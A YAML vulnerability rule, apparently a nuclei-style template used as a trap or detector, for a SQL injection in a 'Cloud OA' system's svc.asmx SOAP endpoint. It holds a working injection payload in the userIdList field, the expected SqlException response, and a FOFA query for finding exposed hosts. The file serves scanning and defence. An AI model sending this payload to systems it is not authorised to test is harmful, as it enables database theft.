rules/nuclei/http/vulnerabilities/other/cloud-oa-system-sqli.yaml

id: cloud-oa-system-sqli
info:
  name: Cloud OA System - SQL Injection
  author: SleepingBag945
  description: 'cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered,
    resulting in a SQL injection vulnerability, which can be used to obtain sensitive
    information in the database.

    '
  severity: high
  reference:
  - https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
  tags: cloud,cloudoa,sqli
traps:
- request:
    method: POST
    path: /OA/PM/svc.asmx
    headers:
      Content-Type: text/xml
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <GetUsersInfo xmlns="http://tempuri.org/">
            <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
          </GetUsersInfo>
        </soap:Body>
      </soap:Envelope>
  response:
    status_code: 500
    headers: {}
    body: System.Data.SqlClient.SqlException{{md5(num)}}
